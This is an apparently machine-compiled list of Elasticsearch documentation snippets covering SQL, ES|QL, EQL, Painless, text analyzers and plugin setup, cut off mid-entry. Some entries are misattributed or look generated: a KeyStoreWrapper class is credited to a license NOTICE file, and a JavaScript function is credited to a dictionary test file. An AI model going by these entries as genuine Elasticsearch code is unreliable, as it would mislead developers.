https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-syntax-select.md#2025-04-21_snippet_4\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM emp LIMIT 1;\n```\n\n----------------------------------------\n\nTITLE: SHOW TABLES with Remote Cluster Filtering\nDESCRIPTION: Shows how to list tables from remote clusters using catalog wildcard patterns and table name filtering.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-syntax-show-tables.md#2025-04-21_snippet_7\n\nLANGUAGE: sql\nCODE:\n```\nSHOW TABLES CATALOG 'my_*' LIKE 'test_emp%';\n```\n\n----------------------------------------\n\nTITLE: Preventing Accidental DNS Lookups\nDESCRIPTION: Restricts methods that can trigger DNS lookups, requiring explicit justification via SuppressWarnings annotation when used.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/forbidden/jdk-signatures.txt#2025-04-21_snippet_9\n\nLANGUAGE: plaintext\nCODE:\n```\n@defaultMessage avoid DNS lookups by accident: if you have a valid reason, then @SuppressWarnings with that reason so its completely clear\njava.net.InetAddress#getHostName()\njava.net.InetAddress#getCanonicalHostName()\n```\n\n----------------------------------------\n\nTITLE: Handling Backported Transport Changes in Java (8.13 Example)\nDESCRIPTION: This Java code snippet, from an 8.13 pull request example, demonstrates checking if the current transport version is at or after the specific backport ID for that version (`8.13_backport_id`) using `onOrAfter`. This ensures the backported serialization logic is applied correctly on this specific patch branch.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/internal/Versioning.md#_snippet_1\n\nLANGUAGE: Java\nCODE:\n```\nif (transportVersion.onOrAfter(8.13_backport_id))\n```\n\n----------------------------------------\n\nTITLE: Implementing KeyStoreWrapper Class in Java for Elasticsearch\nDESCRIPTION: This class implements a wrapper for the KeyStore, providing methods for creating, loading, and saving key stores. It includes functionality for password-based encryption and handling of secure settings.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/security/licenses/accessors-smart-NOTICE.txt#2025-04-22_snippet_2\n\nLANGUAGE: Java\nCODE:\n```\npublic class KeyStoreWrapper implements SecureSettings {\n    private static final String KEYSTORE_TYPE = \"PKCS12\";\n    private final KeyStore keyStore;\n    private final char[] password;\n    private final Path configPath;\n\n    public KeyStoreWrapper(Path configPath, char[] password) throws Exception {\n        this.configPath = configPath;\n        this.password = password;\n        keyStore = KeyStore.getInstance(KEYSTORE_TYPE);\n        if (Files.exists(configPath)) {\n            try (InputStream in = Files.newInputStream(configPath)) {\n                keyStore.load(in, password);\n            }\n        } else {\n            keyStore.load(null, password);\n        }\n    }\n\n    // ... (other methods)\n\n    @Override\n    public void close() throws IOException {\n        Arrays.fill(password, '\\0');\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Access Control Document Example in Elasticsearch DLS\nDESCRIPTION: This code snippet provides an example of an access control document used in Elasticsearch's Document Level Security (DLS). It defines the identity of a user and their access control policy using a query template and parameters. The `_id` typically represents a unique identifier like email or username, and the `query` specifies the conditions for access based on the provided parameters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-dls-overview.md#2025-04-21_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\n```js\n{\n  \"_id\": \"example.user@example.com\",\n  \"identity\": {\n      \"username\": \"example username\",\n      \"email\": \"example.user@example.com\"\n   },\n   \"query\": {\n        \"template\": {\n            \"params\": {\n                \"access_control\": [\n                    \"example.user@example.com\",\n                    \"example group\",\n                    \"example username\"]\n            }\n        },\n        \"source\": \"...\"\n    }\n}\n```\n```\n\n----------------------------------------\n\nTITLE: Finding Substring Position Using LOCATE in ESQL\nDESCRIPTION: Shows how to use the LOCATE function to find the position of a substring 'll' within the string 'hello'. The function returns 3 since 'll' starts at position 3 in 'hello' (1-based indexing).\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/locate.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a = \"hello\"\n| EVAL a_ll = LOCATE(a, \"ll\")\n```\n\n----------------------------------------\n\nTITLE: ES|QL Quoted Identifiers\nDESCRIPTION: Example of using backticks to quote field identifiers that contain special characters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/esql-syntax.md#2025-04-21_snippet_2\n\nLANGUAGE: esql\nCODE:\n```\nFROM index\n| KEEP `1.field`\n```\n\n----------------------------------------\n\nTITLE: Geotile Grid Aggregation with Bounds Parameter\nDESCRIPTION: This example shows how to use the optional bounds parameter within the geotile_grid aggregation to restrict the cells considered to those that intersect with the provided bounding box. The bounds parameter works independently of any geo_bounding_box queries.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-geotilegrid-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPOST /museums/_search?size=0\n{\n  \"aggregations\": {\n    \"tiles-in-bounds\": {\n      \"geotile_grid\": {\n        \"field\": \"location\",\n        \"precision\": 22,\n        \"bounds\": {\n          \"top_left\": \"POINT (4.9 52.4)\",\n          \"bottom_right\": \"POINT (5.0 52.3)\"\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: StartsWith String Comparison Examples in EQL\nDESCRIPTION: Examples of using the startsWith function for string prefix matching, including case-sensitive and case-insensitive comparisons.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-function-ref.md#2025-04-21_snippet_11\n\nLANGUAGE: eql\nCODE:\n```\nstartsWith(\"regsvr32.exe\", \"regsvr32\")  // returns true\nstartsWith(\"regsvr32.exe\", \"Regsvr32\")  // returns false\nstartsWith(\"regsvr32.exe\", \"explorer\")  // returns false\nstartsWith(\"\", \"\")                      // returns true\n\n// Make matching case-insensitive\nstartsWith~(\"regsvr32.exe\", \"Regsvr32\")  // returns true\n\n// process.name = \"regsvr32.exe\"\nstartsWith(process.name, \"regsvr32\")    // returns true\nstartsWith(process.name, \"explorer\")    // returns false\n\n// process.name = \"regsvr32\"\nstartsWith(\"regsvr32.exe\", process.name) // returns true\nstartsWith(\"explorer.exe\", process.name) // returns false\n\n// null handling\nstartsWith(\"regsvr32.exe\", null)        // returns null\nstartsWith(\"\", null)                    // returns null\nstartsWith(null, \"regsvr32\")            // returns null\nstartsWith(null, null)                  // returns null\n```\n\n----------------------------------------\n\nTITLE: Using COALESCE Function in ESQL\nDESCRIPTION: This snippet demonstrates the usage of the COALESCE function in ESQL. It creates a row with two columns, 'a' (null) and 'b' (\"b\"), and then applies the COALESCE function to return the first non-null value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/coalesce.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a=null, b=\"b\"\n| EVAL COALESCE(a, b)\n```\n\n----------------------------------------\n\nTITLE: Stop Token Filter After Synonym Token Filter Example\nDESCRIPTION: Illustrates the impact of removing tokens after synonym expansion, which can prevent matching for expanded terms\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-synonym-graph-tokenfilter.md#2025-04-21_snippet_6\n\nLANGUAGE: text\nCODE:\n```\nSynonym rule: foo, bar => baz\nStop filter removes: baz\nResult: No matches for foo or bar\n```\n\n----------------------------------------\n\nTITLE: Division Operator in Elasticsearch Script\nDESCRIPTION: Implements division within a custom script, evaluating whether the quotient of `serial_event_id` and a constant equals a target value. Facilitates division operations within the Elasticsearch querying framework.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/eql/src/test/resources/querytranslator_tests.txt#2025-04-21_snippet_19\n\nLANGUAGE: Elasticsearch Painless\nCODE:\n```\n\"script\":{\"source\":\"InternalEqlScriptUtils.multiValueDocValues(doc,params.v0,X0->InternalQlScriptUtils.nullSafeFilter(InternalQlScriptUtils.eq(InternalEqlScriptUtils.div(X0,params.v1),params.v2)))\",\"params\":{\"v0\":\"serial_event_id\",\"v1\":2,\"v2\":41}}\n```\n\n----------------------------------------\n\nTITLE: Customizing Edge N-gram Filter Parameters\nDESCRIPTION: Creates a custom edge_ngram filter that generates n-grams between 3-5 characters with a whitespace tokenizer.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-edgengram-tokenfilter.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT edge_ngram_custom_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"default\": {\n          \"tokenizer\": \"whitespace\",\n          \"filter\": [ \"3_5_edgegrams\" ]\n        }\n      },\n      \"filter\": {\n        \"3_5_edgegrams\": {\n          \"type\": \"edge_ngram\",\n          \"min_gram\": 3,\n          \"max_gram\": 5\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Combining Arrays with Delimiter using mv_zip Function in ESQL\nDESCRIPTION: Demonstrates using the mv_zip function to combine elements from two arrays with a delimiter. The function joins corresponding elements from each array using the specified delimiter, and handles arrays of different lengths by including unpaired elements from the longer array.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/mv_zip.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a = [\"x\", \"y\", \"z\"], b = [\"1\", \"2\"]\n| EVAL c = mv_zip(a, b, \"-\")\n| KEEP a, b, c\n```\n\n----------------------------------------\n\nTITLE: Creating Custom Analyzer with Keyword Repeat\nDESCRIPTION: Example of creating a custom analyzer using the create index API that incorporates keyword_repeat, porter_stem, and remove_duplicates filters for comprehensive token processing.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-keyword-repeat-tokenfilter.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPUT /my-index-000001\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"my_custom_analyzer\": {\n          \"tokenizer\": \"standard\",\n          \"filter\": [\n            \"keyword_repeat\",\n            \"porter_stem\",\n            \"remove_duplicates\"\n          ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Removing Custom Metadata from Cluster State\nDESCRIPTION: Demonstrates removal of custom metadata from the cluster state when it prevents node startup. Shows the process for removing specific custom metadata types.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/command-line-tools/node-tool.md#2025-04-21_snippet_7\n\nLANGUAGE: txt\nCODE:\n```\nnode$ ./bin/elasticsearch-node remove-customs snapshot_lifecycle\n\n    WARNING: Elasticsearch MUST be stopped before running this tool.\n\nThe following customs will be removed:\nsnapshot_lifecycle\n\nYou should only run this tool if you have broken custom metadata in the\ncluster state that prevents the cluster state from being loaded.\nThis tool can cause data loss and its use should be your last resort.\n\nDo you want to proceed?\n\nConfirm [y/N] y\n\nCustoms were successfully removed from the cluster state\n```\n\n----------------------------------------\n\nTITLE: TO_CARTESIANSHAPE Function Header Definition\nDESCRIPTION: Markdown header definition for the TO_CARTESIANSHAPE function with anchor tag for documentation navigation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/to_cartesianshape.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n## `TO_CARTESIANSHAPE` [esql-to_cartesianshape]\n```\n\n----------------------------------------\n\nTITLE: Inserting Data into ElasticSearch Index with JavaScript\nDESCRIPTION: This code snippet inserts a JSON document into a specified ElasticSearch index using the JavaScript client, with error handling included. It is used to add new records for search and analysis purposes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/plugins/analysis-kuromoji/src/test/resources/org/elasticsearch/plugin/analysis/kuromoji/user_dict.txt#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\nasync function indexDocument(indexName, document) {\n  try {\n    await client.index({\n      index: indexName,\n      body: document\n    });\n    console.log('Document indexed successfully');\n  } catch (error) {\n    console.error('Error indexing document:', error);\n  }\n}\n\n// Example usage:\n// indexDocument('test_index', { test_name: '制限スピード' });\n```\n\n----------------------------------------\n\nTITLE: Configuring CSV Processor in Elasticsearch Ingest Pipeline\nDESCRIPTION: This snippet demonstrates how to configure the CSV processor in an Elasticsearch ingest pipeline. It extracts data from 'my_field' and assigns the values to 'field1' and 'field2'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/csv-processor.md#2025-04-21_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\n{\n  \"csv\": {\n    \"field\": \"my_field\",\n    \"target_fields\": [\"field1\", \"field2\"]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Finnish Custom Analyzer in Elasticsearch\nDESCRIPTION: This snippet outlines how to create a custom analyzer for Finnish language texts in Elasticsearch. It emphasizes the use of stop words, keywords, and a stemmer to optimize language processing and indexing.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-lang-analyzer.md#2025-04-21_snippet_13\n\nLANGUAGE: json\nCODE:\n```\nPUT /finnish_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"filter\": {\n        \"finnish_stop\": {\n          \"type\":       \"stop\",\n          \"stopwords\":  \"_finnish_\" <1>\n        },\n        \"finnish_keywords\": {\n          \"type\":       \"keyword_marker\",\n          \"keywords\":   [\"esimerkki\"] <2>\n        },\n        \"finnish_stemmer\": {\n          \"type\":       \"stemmer\",\n          \"language\":   \"finnish\"\n        }\n      },\n      \"analyzer\": {\n        \"rebuilt_finnish\": {\n          \"tokenizer\":  \"standard\",\n          \"filter\": [\n            \"lowercase\",\n            \"finnish_stop\",\n            \"finnish_keywords\",\n            \"finnish_stemmer\"\n          ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Regular Expression Matching in Elasticsearch EQL\nDESCRIPTION: Shows how to use regex and regex~ for regular expression matching in Elasticsearch EQL.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-syntax.md#2025-04-21_snippet_34\n\nLANGUAGE: eql\nCODE:\n```\nprocess_name regex \"cmd.*\\.exe\"\n```\n\n----------------------------------------\n\nTITLE: Keyword Marker with Stemmer Analysis\nDESCRIPTION: Example showing how to prevent stemming of specific words using keyword_marker filter before the stemmer filter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-keyword-marker-tokenfilter.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nGET /_analyze\n{\n  \"tokenizer\": \"whitespace\",\n  \"filter\": [\n    {\n      \"type\": \"keyword_marker\",\n      \"keywords\": [ \"jumping\" ]\n    },\n    \"stemmer\"\n  ],\n  \"text\": \"fox running and jumping\"\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring a Custom Analyzer with Uppercase Filter in JSON\nDESCRIPTION: This JSON-based configuration sets up a custom analyzer in Elasticsearch that utilizes a whitespace tokenizer combined with the 'uppercase' filter for case normalization purposes. This setup requires the Elasticsearch indices create API. The primary input is the JSON configuration, and the key parameter is 'filter', which specifies the 'uppercase' filter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-uppercase-tokenfilter.md#2025-04-21_snippet_1\n\nLANGUAGE: json\nCODE:\n```\nPUT uppercase_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"whitespace_uppercase\": {\n          \"tokenizer\": \"whitespace\",\n          \"filter\": [ \"uppercase\" ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using CURRENT_TIME with Precision Parameter in Elasticsearch SQL\nDESCRIPTION: Example demonstrating how to use CURRENT_TIME with a precision parameter to round fractional seconds.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_15\n\nLANGUAGE: sql\nCODE:\n```\nSELECT CURRENT_TIME(1) AS result;\n\n         result\n------------------------\n12:31:27.2Z\n```\n\n----------------------------------------\n\nTITLE: Def Type AND Using '&&': Painless Example\nDESCRIPTION: Shows the implementation of the AND operator on 'def' types in Painless. The operation uses dynamically typed booleans, converting them to 'def' types for logical evaluations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-boolean.md#2025-04-21_snippet_32\n\nLANGUAGE: Painless\nCODE:\n```\ndef x = true;\ndef y = x && true;\nx = false;\ny = y && x;\n```\n\n----------------------------------------\n\nTITLE: Configuring Basic Highlighting Tags in Elasticsearch\nDESCRIPTION: This example demonstrates how to customize the HTML tags used for highlighting by setting pre_tags and post_tags properties. By default, highlighting wraps text in <em> tags, but this can be changed to custom tags.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/highlighting.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\" : {\n    \"match\": { \"user.id\": \"kimchy\" }\n  },\n  \"highlight\" : {\n    \"pre_tags\" : [\"<tag1>\"],\n    \"post_tags\" : [\"</tag1>\"],\n    \"fields\" : {\n      \"body\" : {}\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Trimming Leading Whitespace with LTRIM in ESQL\nDESCRIPTION: This ESQL query demonstrates the usage of the LTRIM function to remove leading whitespace from string values. It also shows how to concatenate strings to add single quotes around the trimmed values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/ltrim.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW message = \"   some text  \",  color = \" red \"\n| EVAL message = LTRIM(message)\n| EVAL color = LTRIM(color)\n| EVAL message = CONCAT(\"'\", message, \"'\")\n| EVAL color = CONCAT(\"'\", color, \"'\")\n```\n\n----------------------------------------\n\nTITLE: Configuring Text Expansion Processor in Elasticsearch\nDESCRIPTION: Defines the configuration options for the text expansion processor, including results field and tokenization settings. It supports various tokenization methods like BERT, DeBERTa, MPNet, and RoBERTa, each with specific properties for handling token truncation and sequence spanning.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/inference-processor.md#2025-04-21_snippet_8\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"results_field\": \"<dependent_variable>_prediction\",\n  \"tokenization\": {\n    \"bert\": {\n      \"span\": -1,\n      \"truncate\": \"first\"\n    },\n    \"deberta_v2\": {\n      \"span\": -1,\n      \"truncate\": \"first\"\n    },\n    \"roberta\": {\n      \"span\": -1,\n      \"truncate\": \"first\"\n    },\n    \"mpnet\": {\n      \"truncate\": \"first\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: WKT String Geo Sort in Elasticsearch\nDESCRIPTION: Shows geo-distance sorting using Well-Known Text (WKT) format for location specification.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/sort-search-results.md#2025-04-21_snippet_14\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"sort\": [\n    {\n      \"_geo_distance\": {\n        \"pin.location\": \"POINT (-70 40)\",\n        \"order\": \"asc\",\n        \"unit\": \"km\"\n      }\n    }\n  ],\n  \"query\": {\n    \"term\": { \"user\": \"kimchy\" }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Useful OpenSSL Commands for Certificate Management in Elasticsearch\nDESCRIPTION: This snippet provides a set of OpenSSL commands useful for certificate management tasks such as checking private keys, reading public and private keys from PKCS12 files, decoding PEM-formatted public keys, and showing certificates from a URL.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/run.ssl/readme.md#2025-04-21_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nopenssl rsa -in private-ca.key -check # check private key\nopenssl pkcs12 -info -in private-cert$i.p12 -nodes -nocerts # read private keys from p12\nopenssl pkcs12 -info -in private-cert$i.p12 -nodes -nokeys # read public keys from p12\nopenssl x509 -in public-cert$i.pem -text # decode PEM formatted public key\nopenssl s_client -showcerts -connect localhost:9200 </dev/null # show cert from URL\n```\n\n----------------------------------------\n\nTITLE: Creating Azure VM Image for Elasticsearch Node (Shell)\nDESCRIPTION: This snippet demonstrates how to create an image from an existing Elasticsearch node VM in Azure. It includes shutting down the instance, capturing the image, and recreating the instance using the new image.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/discovery-azure-classic-scale.md#2025-04-21_snippet_0\n\nLANGUAGE: sh\nCODE:\n```\n# Shutdown the instance\nazure vm shutdown myesnode1\n\n# Create an image from this instance (it could take some minutes)\nazure vm capture myesnode1 esnode-image --delete\n\n# Note that the previous instance has been deleted (mandatory)\n# So you need to create it again and BTW create other instances.\n\nazure vm create azure-elasticsearch-cluster \\\n                esnode-image \\\n                --vm-name myesnode1 \\\n                --location \"West Europe\" \\\n                --vm-size extrasmall \\\n                --ssh 22 \\\n                --ssh-cert /tmp/azure-certificate.pem \\\n                elasticsearch password1234\\!\\!\n```\n\n----------------------------------------\n\nTITLE: Configuring Multi-Zone GCE Discovery in Elasticsearch\nDESCRIPTION: This YAML configuration demonstrates how to set up Elasticsearch to discover nodes across multiple Google Cloud Engine zones. It specifies the project ID and multiple zones to search for Elasticsearch instances, enabling cross-zone cluster formation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/discovery-gce-usage-zones.md#2025-04-21_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\ncloud:\n  gce:\n    project_id: <your-google-project-id>\n    zone: [\"<your-zone1>\", \"<your-zone2>\"]\ndiscovery:\n  seed_providers: gce\n```\n\n----------------------------------------\n\nTITLE: DateTime Difference Units Table in Markdown\nDESCRIPTION: A markdown table showing all supported time units and their corresponding abbreviations for the datetime difference function. Includes units from years down to nanoseconds.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/date_diff.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| unit | abbreviations |\n| --- | --- |\n| year | years, yy, yyyy |\n| quarter | quarters, qq, q |\n| month | months, mm, m |\n| dayofyear | dy, y |\n| day | days, dd, d |\n| week | weeks, wk, ww |\n| weekday | weekdays, dw |\n| hour | hours, hh |\n| minute | minutes, mi, n |\n| second | seconds, ss, s |\n| millisecond | milliseconds, ms |\n| microsecond | microseconds, mcs |\n| nanosecond | nanoseconds, ns |\n```\n\n----------------------------------------\n\nTITLE: Invalid Dynamic Type Casts in Painless\nDESCRIPTION: Demonstrates invalid dynamic type casts in Painless that result in errors, specifically when trying to implicitly cast from `def` to `short` or `HashMap` to `List`. These examples highlight the limitations of implicit casting.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-casting.md#2025-04-21_snippet_7\n\nLANGUAGE: painless\nCODE:\n```\ndef d = 1;                  <1>\nshort s = d;       // error <2>\nd = new HashMap();          <3>\nList l = d;        // error <4>\n```\n\n----------------------------------------\n\nTITLE: Syntax Diagram Inclusion for CATEGORIZE Function in Markdown\nDESCRIPTION: Markdown code to include a syntax diagram image for the CATEGORIZE function in the documentation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/categorize.md#2025-04-21_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\n:::{image} ../../../images/functions/categorize.svg\n:alt: Embedded\n:class: text-center\n:::\n```\n\n----------------------------------------\n\nTITLE: Example configuration file for self-managed connector\nDESCRIPTION: This YAML snippet shows an example configuration file for a self-managed connector.  It configures the Elasticsearch host and API key, as well as the connector ID, service type, and API key for the OneDrive connector.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-onedrive.md#2025-04-21_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\n# When connecting to your cloud deployment you should edit the host value\nelasticsearch.host: http://host.docker.internal:9200\nelasticsearch.api_key: <ELASTICSEARCH_API_KEY>\n\nconnectors:\n  -\n    connector_id: <CONNECTOR_ID_FROM_KIBANA>\n    service_type: onedrive\n    api_key: <CONNECTOR_API_KEY_FROM_KIBANA> # Optional. If not provided, the connector will use the elasticsearch.api_key instead\n```\n\n----------------------------------------\n\nTITLE: Basic Pattern Capture Example - Input Text\nDESCRIPTION: Sample input text to demonstrate pattern matching\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-pattern-capture-tokenfilter.md#2025-04-21_snippet_1\n\nLANGUAGE: text\nCODE:\n```\n\"abc123def456\"\n```\n\n----------------------------------------\n\nTITLE: Using WEEK_OF_YEAR Function in Elasticsearch SQL\nDESCRIPTION: Extracts the week number from a date/datetime expression. Shows comparison between WEEK and ISOWEEK functions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_67\n\nLANGUAGE: sql\nCODE:\n```\nSELECT WEEK(CAST('1988-01-05T09:22:10Z' AS TIMESTAMP)) AS week, ISOWEEK(CAST('1988-01-05T09:22:10Z' AS TIMESTAMP)) AS isoweek;\n```\n\n----------------------------------------\n\nTITLE: Importing ScoreScriptUtils Functions for Scoring Operations in Java\nDESCRIPTION: This snippet demonstrates a static import statement that imports various scoring functions from the ScoreScriptUtils class. This enables the use of decay functions, saturation, normalization, and various similarity calculations directly within scoring scripts, enhancing their capabilities and flexibility.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.score.txt#2025-04-21_snippet_3\n\nLANGUAGE: Java\nCODE:\n```\nstatic_import {\n    double saturation(double, double) from_class org.elasticsearch.script.ScoreScriptUtils\n    double sigmoid(double, double, double) from_class org.elasticsearch.script.ScoreScriptUtils\n    double randomScore(org.elasticsearch.script.ScoreScript, int, String) bound_to org.elasticsearch.script.ScoreScriptUtils$RandomScoreField\n    double randomScore(org.elasticsearch.script.ScoreScript, int) bound_to org.elasticsearch.script.ScoreScriptUtils$RandomScoreDoc\n    double decayGeoLinear(String, String, String, double, GeoPoint) bound_to org.elasticsearch.script.ScoreScriptUtils$DecayGeoLinear\n    double decayGeoExp(String, String, String, double, GeoPoint) bound_to org.elasticsearch.script.ScoreScriptUtils$DecayGeoExp\n    double decayGeoGauss(String, String, String, double, GeoPoint) bound_to org.elasticsearch.script.ScoreScriptUtils$DecayGeoGauss\n    double decayNumericLinear(double, double, double, double, double)bound_to org.elasticsearch.script.ScoreScriptUtils$DecayNumericLinear\n    double decayNumericExp(double, double, double, double, double) bound_to org.elasticsearch.script.ScoreScriptUtils$DecayNumericExp\n    double decayNumericGauss(double, double, double, double, double) bound_to org.elasticsearch.script.ScoreScriptUtils$DecayNumericGauss\n    double decayDateLinear(String, String, String, double, ZonedDateTime) bound_to org.elasticsearch.script.ScoreScriptUtils$DecayDateLinear\n    double decayDateExp(String, String, String, double, ZonedDateTime) bound_to org.elasticsearch.script.ScoreScriptUtils$DecayDateExp\n    double decayDateGauss(String, String, String, double, ZonedDateTime) bound_to org.elasticsearch.script.ScoreScriptUtils$DecayDateGauss\n    double l1norm(org.elasticsearch.script.ScoreScript, Object, String) bound_to org.elasticsearch.script.VectorScoreScriptUtils$L1Norm\n    double l2norm(org.elasticsearch.script.ScoreScript, Object, String) bound_to org.elasticsearch.script.VectorScoreScriptUtils$L2Norm\n    double cosineSimilarity(org.elasticsearch.script.ScoreScript, Object, String) bound_to org.elasticsearch.script.VectorScoreScriptUtils$CosineSimilarity\n    double dotProduct(org.elasticsearch.script.ScoreScript, Object, String) bound_to org.elasticsearch.script.VectorScoreScriptUtils$DotProduct\n    double hamming(org.elasticsearch.script.ScoreScript, Object, String) bound_to org.elasticsearch.script.VectorScoreScriptUtils$Hamming\n}\n```\n\n----------------------------------------\n\nTITLE: Enabling HTTP Body Tracing\nDESCRIPTION: Configures logging levels for both HTTP tracers to enable body tracing.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/networking-settings.md#2025-04-21_snippet_13\n\nLANGUAGE: console\nCODE:\n```\nPUT _cluster/settings\n{\n   \"persistent\" : {\n      \"logger.org.elasticsearch.http.HttpTracer\" : \"TRACE\",\n      \"logger.org.elasticsearch.http.HttpBodyTracer\" : \"TRACE\"\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: Combining Keyword Tokenizer with Lowercase Filter\nDESCRIPTION: Shows how to use the keyword tokenizer with a lowercase token filter to normalize structured data like email addresses, converting the entire text to lowercase\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-keyword-tokenizer.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST _analyze\n{\n  \"tokenizer\": \"keyword\",\n  \"filter\": [ \"lowercase\" ],\n  \"text\": \"john.SMITH@example.COM\"\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Index with Percolator and Text Fields in Elasticsearch\nDESCRIPTION: This code snippet demonstrates how to create an Elasticsearch index with a text field for storing document messages and a percolator field for storing queries. The percolator field type allows stored queries to be matched against incoming documents.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-percolate-query.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT /my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"message\": {\n        \"type\": \"text\"\n      },\n      \"query\": {\n        \"type\": \"percolator\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Updating Cluster Settings for Reindex Performance in 